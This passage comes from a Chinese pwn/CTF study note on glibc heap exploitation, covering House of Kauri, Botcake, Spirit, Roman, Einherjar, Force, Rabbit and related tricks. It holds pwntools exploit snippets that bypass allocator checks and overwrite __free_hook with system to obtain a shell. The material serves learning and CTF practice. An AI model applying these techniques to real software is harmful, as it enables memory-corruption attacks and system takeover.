</span></span><span class=line><span class=cl>	<span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;global_max_fast&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mi>7</span> <span class=o>-</span> <span class=n>i</span><span class=p>))</span></span></span></code></pre></div></div><p><strong>修改 flags 最低字节为 0 使调用 malloc_consolidate(av)</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main_arena&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mi>6</span><span class=p>))</span></span></span></code></pre></div></div><p><strong>最后一步攻击</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x1c00</span><span class=p>)</span> <span class=c1># bin中无可用chunk，切割top chunk分配一个堆块</span>
</span></span><span class=line><span class=cl><span class=c1># 查看__free_hook地址，可能在申请堆块10或11内</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span> <span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 修改为system进行劫持</span></span></span></code></pre></div></div><h3 id=house-of>House of</h3><h4 id=house-of-kauri>House of kauri</h4><p>修改 <code>size</code> 使两次 <code>free</code> 的同一块内存进入不同 <code>entries</code> 来绕过 tcache key 的 double free 检查</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># chunk 10 用于防止tcache count为0</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span> <span class=c1># chunk 10 进入 tcache bin</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># chunk 1 进入 tcache bin 0x30</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x20</span><span class=p>))</span> <span class=c1># 修改 chunk 1 的 size 为 0x20</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># chunk 1 进入 tcache bin 0x20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># 申请出__free_hook堆块</span></span></span></code></pre></div></div><h4 id=house-of-botcake>House of Botcake</h4><ul><li>将同一个 chunk 释放到 tcache 和 unsorted bin 中，释放在 unsorted bin 的 chunk 借助堆块合并改变大小</li><li>会形成堆块堆叠，一次 double free 可多次使用</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span> <span class=n>new</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># chunk 0-9</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span> <span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=c1># chunk 0-6 进入 tcache bin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=c1># free chunk8进入unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span> <span class=c1># free chunk7, 与chunk8合并为chunk7</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># tcache 取出 chunk0</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span> <span class=c1># chunk8 进入 tcache bin，此时chunk8在chunk7之间</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=mh>0x410</span><span class=p>)</span> <span class=c1># 申请chunk7可以编辑chunk8的fd</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x210</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span> <span class=c1># chunk8指向target</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># chunk8</span>
</span></span><span class=line><span class=cl><span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x200</span><span class=p>)</span> <span class=c1># target劫持</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241128190118374.png alt=图片无法加载><h4 id=house-of-io>House of IO</h4><p>将<code>tcache_perthread_struct</code>结构体释放，再申请回来控制整个 tcache 分配</p><h4 id=house-of-spirit>House of Spirit</h4><ul><li>glibc-2.23，在目标位置伪造 fastbin 然后释放，最终实现指定地址分配 chunk</li><li><strong>适用场景</strong>：需对不可控的中间区域进行利用</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241228000142845.png alt=图片无法加载><p><strong>绕过</strong></p><ul><li><p>fake chunk 的 <code>ISMMAP</code> 位<strong>不能为 1</strong>，因为 free 时，若是 mmap 的 chunk，会单独处理</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>chunk_is_mmapped</span><span class=p>(</span><span class=n>p</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=nf>munmap_chunk</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div></li><li><p>fake chunk 地址需对齐<code>MALLOC_ALIGN_MASK</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span><span class=p>(</span><span class=n>size</span> <span class=o>&lt;</span> <span class=n>MINSIZE</span> <span class=o>||</span> <span class=o>!</span><span class=nf>aligned_OK</span><span class=p>(</span><span class=n>size</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;free(): invalid size&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>errout</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div></li><li><p>fake chunk 的 size 大小需要满足对应 fastbin 的需求(&lt;= 0x80 on x64)</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=nf>get_max_fast</span><span class=p>())</span></span></span></code></pre></div></div></li><li><p>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时不能大于<code>av->system_mem</code></p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>have_lock</span> <span class=o>||</span> <span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nf>assert</span><span class=p>(</span><span class=n>locked</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>mutex_lock</span><span class=p>(</span><span class=o>&amp;</span><span class=n>av</span><span class=o>-&gt;</span><span class=n>mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>locked</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span> <span class=o>||</span> <span class=nf>chunksize</span><span class=p>(</span><span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>size</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;free(): invalid next size (fast)&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>errout</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}...</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div></li><li><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 情况</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>old</span> <span class=o>==</span> <span class=n>p</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>errstr</span> <span class=o>=</span> <span class=s>&#34;double free or corruption (fasttop)&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>errout</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div></li></ul><p><strong>利用</strong></p><ul><li>构造 fake chunk，free fake chunk 进入 fast bin，触发 House of Spirit，申请后获取到 fake chunk，修改不可控区域(返回地址等)</li><li>该过程也可能在栈上构造，构造 malloc 和 free 的指针时指向 chunk 内容而不是 chunk 头</li></ul><h4 id=house-of-roman>House of Roman</h4><ul><li><p>绕过 ALSR，无需泄露 libc，通过覆盖 unsorted bin 的 fd 的低 2 字节，对 glibc 上某结构进行 1/16 概率的 12bit 爆破</p></li><li><p>条件：UAF、可创建任意大小的堆块</p></li><li><p>利用：fastbin attack & unsorted bin attack</p></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241221224207019.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>p16</span><span class=p>(</span><span class=mh>0x1234</span><span class=p>))</span> <span class=c1># 低两字节中，234为确定，1/16爆破1</span></span></span></code></pre></div></div><h4 id=house-of-einherjar>House Of Einherjar</h4><ul><li>已泄露了堆地址及 libc 基址，利用释放不在 fast bin 大小范围内的堆块会尝试合并前面已释放堆块的机制</li><li>伪造 chunk 头部实现任意地址内存申请，可以使用 off by null 转 overlapping 方法构造也可用下述方法</li></ul><p>泄露地址有零截断想方法填充 0 为字符然后恢复</p><p><strong>绕过</strong></p><ul><li><p>使<code>fake_chunk</code>的<code>fd</code>和<code>bk</code>，均指向自己：<code>&amp;fake_chunk</code>来绕过 unlink 检查</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>FD</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>!=</span> <span class=n>P</span> <span class=o>||</span> <span class=n>BK</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>!=</span> <span class=n>P</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span><span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=s>&#34;corrupted double-linked list&#34;</span><span class=p>,</span> <span class=n>P</span><span class=p>,</span> <span class=n>AV</span><span class=p>);</span></span></span></code></pre></div></div></li><li><p>令<code>fake_prev_size1 = fake_size</code>绕过 glibc-2.26 版本检查</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>P</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>prev_size</span><span class=p>(</span><span class=nf>next_chunk</span><span class=p>(</span><span class=n>P</span><span class=p>)),</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span><span class=p>(</span><span class=s>&#34;corrupted size vs. prev_size&#34;</span><span class=p>);</span></span></span></code></pre></div></div></li><li><p>令<code>fake chunk:fake_size = chunk2:fake_prev_size2</code>来绕过 glibc-2.29 版本对 prevsize 的检查</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>!=</span> <span class=n>prevsize</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;corrupted size vs. prev_size while consolidating&#34;</span><span class=p>);</span></span></span></code></pre></div></div></li></ul><p>溢出修改 chunk2 的<code>prev_size</code>为<code>&amp;chunk2 - &amp;fake_chunk</code>并将<code>PREV_INUSE</code>置 0，<code>free chunk2</code>触发<code>House Of Einherjar</code>将 fake chunk 到 chunk2 在 unsorted bin 中完成合并</p><img src=/img/pwn_note.zh-cn.assets/image-20241224200905322.png alt=图片无法加载><h4 id=house-of-force>House of Force</h4><ul><li>glibc&lt;2.29，溢出将 top chunk 的 size 改为极大值(0xffffffff)，绕过对用户请求大小和 top chunk 现有 size 的验证</li><li>将 top chunk 更新到任意内存，再次申请堆块写入数据，即任意地址写</li><li><strong>条件</strong>：malloc 申请堆块大小不受限制，可控 top chunk 的 size 位，且代码使用<code>size_t</code>机器字长作为堆大小</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 获取当前的top chunk及大小
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>victim</span> <span class=o>=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>size</span>   <span class=o>=</span> <span class=nf>chunksize</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 从top chunk中切下一块内存返回给malloc
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>nb</span> <span class=o>+</span> <span class=n>MINSIZE</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>remainder_size</span> <span class=o>=</span> <span class=n>size</span> <span class=o>-</span> <span class=n>nb</span><span class=p>;</span> <span class=c1>// remainder_size为切割后的剩余大小
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>remainder</span> <span class=o>=</span> <span class=nf>chunk_at_offset</span><span class=p>(</span><span class=n>victim</span><span class=p>,</span> <span class=n>nb</span><span class=p>);</span><span class=c1>// remainder为切割前top chunk+nb值，即切割后top chunk地址
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 控制nb值
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span> <span class=o>=</span> <span class=n>remainder</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>利用</strong></p><p>① 泄露堆基地址和 libc 基址：<strong>同时释放 2 个 chunk 进入 unsorted bin</strong></p><p>② 修改 top chunk 的 size</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>n64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=mh>0x10000000000000000</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>n64</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)))</span></span></span></code></pre></div></div><p>③ 劫持<code>__free_hook</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 需要调试其中的offset使得top chunk的size位为极大值而非0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>n64</span><span class=p>((</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>])</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=n>offset</span><span class=p>)</span> <span class=o>-</span> <span class=n>top_chunk_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span> <span class=c1># 包含__free_hook</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x48</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># getshell</span></span></span></code></pre></div></div><p>glibc2.29 起新增对 top chunk size 的合法性检查，失效</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__glibc_unlikely</span> <span class=p>(</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): corrupted top size&#34;</span><span class=p>);</span></span></span></code></pre></div></div><h4 id=house-of-rabbit>House of Rabbit</h4><ul><li>glibc-2.23~glibc-2.26，利用 malloc_consolidate 将 fast bin 放入 unsotrted bin</li><li>从 unsorted bin 进 large bin 以及 large bin 切割 chunk 时对 <strong>size 检查不严格</strong></li><li>从而可以在不用严格保证 size 正确的情况下将 fake chunk 申请出来，甚至可以任意地址 malloc</li><li>需要不断可控的 fake chunk 来更改 size 位</li></ul><p><strong>前提条件</strong></p><p>① <strong>任意地址 malloc 需要让伪造 chunk 从 unsorted bin 进入 large bin 最后一个 bin ，即 size 至少为 0x80000，而 system_mem 初始默认为 0x21000 ，卡在以下代码中</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
